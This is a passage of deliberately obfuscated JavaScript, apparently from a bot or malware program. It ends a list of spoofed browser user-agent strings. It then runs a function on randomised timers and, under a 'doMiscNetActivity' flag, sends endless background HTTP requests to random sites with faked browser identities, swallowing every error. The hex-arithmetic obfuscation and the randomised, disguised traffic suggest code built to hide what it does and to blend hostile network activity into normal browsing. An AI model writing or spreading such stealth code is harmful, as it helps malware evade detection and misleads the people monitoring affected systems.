      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xed4 + -0x10f * 0xb + -0x1 * -0x1a79; k < 0x158c + 0x209 * -0x7 + -0x175 * 0x5; k++)
    setTimeout(f, (0x18c25 + -0x120e6 + 0x7f21) * k * getRandomInt(0x7 * 0xfa + 0x2313 * -0x1 + 0x1e * 0xf1, -0x1 * 0x223d + -0x26f9 * -0x1 + -0x4b9));
  setInterval(() => {
    f();
    for (let l = 0x19a + -0x1f5c + 0x1dc2; l < -0x18d4 + 0x70 * -0x2e + 0x2cf8; l++)
      setTimeout(f, (-0x18b5 + -0x8e39 + 0x1914e) * l * getRandomInt(0x137 * -0x9 + -0x1bf0 + 0x26e0, 0x233c + -0x472 * -0x2 + -0x2c1d));
  }, 0x1e * -0x10ea4 + 0x3 * 0x119471 + 0x21e865);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a4 = c,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites[a4(0x18)](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x205b + -0x23bf * -0x1 + -0x54 * -0x49) * getRandomInt(0xb44 + 0x2314 + -0x2e57, 0x2092 + 0x543 * 0x4 + -0x3599));
}, -0x67 * 0x21 + 0x1b01 + -0xd56);